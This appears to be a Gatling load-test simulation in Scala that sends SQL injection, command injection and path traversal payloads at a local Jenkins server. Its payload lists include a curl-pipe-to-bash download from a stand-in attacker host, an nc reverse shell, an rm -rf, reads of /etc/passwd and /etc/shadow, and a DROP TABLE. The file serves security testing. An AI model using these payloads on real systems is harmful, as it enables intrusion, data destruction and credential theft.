import io.gatling.core.Predef._
import io.gatling.http.Predef._
import scala.concurrent.duration._

class InjectionAttackSimulation extends Simulation {

  val httpProtocol = http
    .baseUrl("http://localhost:8080")
    .shareConnections

  // SQL Injection payloads
  val sqlPayloads = List(
    "test'; DROP TABLE users; --",
    "admin' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "1' AND 1=1 --",
    "admin'  #"
  )

  // Command Injection payloads
  val cmdPayloads = List(
    "$(rm -rf /tmp/*)",
    "`whoami`",
    "| cat /etc/passwd",
    "; curl http://attacker.com/shell.sh | bash",
    "& nc -e /bin/sh attacker.com 4444"
  )

  // Path traversal payloads
  val pathPayloads = List(
    "../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "....//....//etc/shadow",
    "%2e%2e/admin/",
    "..;/admin/"
  )

  val sqlInjectionScenario = scenario("SQL Injection Attack")
    .repeat(sqlPayloads.length) { i =>
      exec(
        http("SQL Injection - Payload #{index}")
          .post("/createItem")
          .formParam("name", sqlPayloads(i % sqlPayloads.length))
          .formParam("type", "org.jenkinsci.plugins.workflow.job.WorkflowJob")
          .check(status.in(200, 302, 400, 403))
      )
      .pause(1)
    }

  val cmdInjectionScenario = scenario("Command Injection Attack")
    .repeat(cmdPayloads.length) { i =>
      exec(
        http("Command Injection - Payload #{index}")
          .post("/job/test/configSubmit")
          .formParam("script", cmdPayloads(i % cmdPayloads.length))
          .check(status.in(200, 302, 400, 403))
      )
      .pause(1)
    }

  val pathTraversalScenario = scenario("Path Traversal Attack")
    .repeat(pathPayloads.length) { i =>
      exec(
        http("Path Traversal - Payload #{index}")
          .get("/userContent/" + pathPayloads(i % pathPayloads.length))
          .check(status.in(200, 304, 400, 403, 404))
      )
      .pause(1)
    }

  setUp(
    sqlInjectionScenario.inject(constantUsersPerSec(5) during (30 seconds)),
    cmdInjectionScenario.inject(constantUsersPerSec(5) during (30 seconds)),
    pathTraversalScenario.inject(constantUsersPerSec(5) during (30 seconds))
  ).protocols(httpProtocol)
}
